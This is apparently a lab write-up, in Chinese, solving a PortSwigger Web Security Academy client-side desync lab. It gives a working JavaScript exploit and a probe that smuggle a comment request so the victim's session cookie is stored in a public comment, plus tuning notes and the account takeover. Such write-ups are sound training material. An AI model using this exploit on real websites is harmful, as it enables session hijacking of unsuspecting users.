---
title: "lab-client-side-desync"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-client-side-desync

> evidences: [[request-smuggling-family]]

PortSwigger `request-smuggling/browser/client-side-desync/lab-client-side-desync`(第 29 批,2026-10-06)。

- 实例:`https://0a5200a00417c73c805c03aa00550024.h1-web-security-academy.net/`
  (host 前缀 `h1-` = 纯 HTTP/1.1,CSD 前提;exploit server `exploit-0aef00ae04b0c74880a10248016700d0`)。
- 判定:**solved**(受害者的 `session` 从公开评论里读出 → 用该 cookie 访问 `/my-account` → banner 翻牌)。

## 1) CSD 向量(`POST /`,件 conn_reuse)

`POST /` 回 `302 Location: /en` 且**不读 body** → 后续 body 字节成为同一条 back-end 连接上的下一个请求。
探针(一条连接两条 literal):`POST /` + `Content-Length: 93` + body `GET /404probe HTTP/1.1\r\nHost: <inst>\r\n\r\n`,
再发 `GET /en?cb=1` → 第 2 条请求拿到的是 `404 "Not Found"`(被顶替)= desync 成立。

## 2) 泄漏 gadget:评论 + "body 吃掉 follow-up 请求"

`POST /en/post/comment` 要求 csrf(会话绑定),**但**:前缀 P 自带**我们自己的** `Cookie: session=<我方>`
(请求头块里唯一的 Cookie)→ 应用用我方会话校验 csrf 通过;follow-up 请求的字节落进**请求体**(不是头),
其中就带受害者浏览器自动附上的 `Cookie: ... session=<受害>` → 原样存进公开评论。

```js
const LAB="https://<inst>";
const P="POST /en/post/comment HTTP/1.1\r\nHost: <host>\r\nCookie: session=<我方会话>\r\n"
      +"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 1200\r\n\r\n"
      +"csrf=<我方 csrf>&postId=1&name=vleak&email=a@b.c&website=https://x.example&comment=";
fetch(LAB+"/",{method:"POST",body:P,mode:"cors",credentials:"include"})   // cors 故意触发 CORS 错,阻止跟随 302
 .catch(()=>{ setTimeout(go,200); setTimeout(go,1500); });                 // go() = 下方的 follow-up
function go(){ fetch(LAB+"/en?q=1",{method:"POST",body:"A".repeat(3000),mode:"no-cors",credentials:"include"}); }
```

- **Content-Length 的窗口问题**:`P` 声明的 body 长度必须 ≤ 实际可用字节(P 的 body + follow-up 全部字节),
  否则应用一直等 body、评论不落库(实测 CL=2000 却只发一条短 follow-up → 无评论)。
  受害者的 `Cookie:` 头在头块末尾,所以让 follow-up 带一个 **3000 字节的 POST body** 把"尾部余量"拉大,
  这样 CL 只要落在 `[头块长度, 头块+padding]` 区间即可 → 抗浏览器的头差异。
- 第一次投递(CL=1000 + 2000 padding + 只发一次)在受害者 Chrome/154 上**没落评论**;改成 CL=1200 +
  3000 padding + 200ms/1500ms 两次重试后成功。
- 提取:直接读 `/en/post?postId=1` 的评论区 → `Cookie: victim-fingerprint=…; secret=…; session=<VICTIM>; _lab_analytics=…`。

## 3) 收口

把该 session(可含 `secret`)写进 jar → `lab_http get /my-account`(200,受害者账号)→ `solved_check` true。

## 陷阱

- 只能用 **HTTP/1.1** 目标(`h1-` 域名);h2 目标浏览器不会走 CSD。
- 投递后受害者访问在 exploit `/log` 里可见(`GET /exploit/`,UA `(Victim) … Chrome/154`,IP 10.0.4.199)。
